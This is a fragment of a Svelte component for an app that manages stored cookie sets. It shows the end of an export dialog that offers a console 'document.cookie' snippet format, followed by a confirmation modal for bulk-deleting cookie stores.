				class="p-3 rounded-lg border-2 text-left transition-colors {exportFormat === 'console' ? 'border-blue-500 bg-blue-50 dark:bg-blue-900/30' : 'border-gray-200 dark:border-gray-700 hover:border-gray-300 dark:hover:border-gray-600'}"
				on:click={() => (exportFormat = 'console')}
			>
				<div class="font-medium text-sm">Console</div>
				<div class="text-xs opacity-60">document.cookie JS snippet</div>
			</button>
		</div>
		<div class="flex justify-end gap-3 pt-2">
			<button
				class="px-4 py-2 text-sm rounded-md border border-gray-300 dark:border-gray-600 text-gray-700 dark:text-gray-300 hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors"
				on:click={() => (isExportModalVisible = false)}
			>
				Cancel
			</button>
			<button
				class="px-4 py-2 text-sm rounded-md bg-blue-600 text-white hover:bg-blue-700 transition-colors"
				on:click={handleExport}
			>
				Export
			</button>
		</div>
	</div>
</Modal>
{/if}

<!-- Bulk Delete Confirmation -->
{#if isBulkDeleteAlertVisible}
<Modal
	headerText="Confirm Bulk Delete"
	visible={isBulkDeleteAlertVisible}
	onClose={() => (isBulkDeleteAlertVisible = false)}
>
	<div class="p-6 space-y-4">
		<p class="text-sm text-gray-700 dark:text-gray-300">
			Are you sure you want to delete <strong>{selectedStoreIds.length}</strong> cookie store{selectedStoreIds.length > 1 ? 's' : ''}? This action cannot be undone.
		</p>
		<div class="flex justify-end gap-3">
			<button
				class="px-4 py-2 text-sm rounded-md border border-gray-300 dark:border-gray-600 text-gray-700 dark:text-gray-300 hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors"
				on:click={() => (isBulkDeleteAlertVisible = false)}
			>
				Cancel
			</button>
			<button
				class="px-4 py-2 text-sm rounded-md bg-red-600 text-white hover:bg-red-700 transition-colors disabled:opacity-50"
				on:click={handleBulkDelete}
				disabled={isBulkDeleting}
			>
				{isBulkDeleting ? 'Deleting...' : 'Delete All Selected'}
			</button>
		</div>
	</div>
</Modal>
{/if}
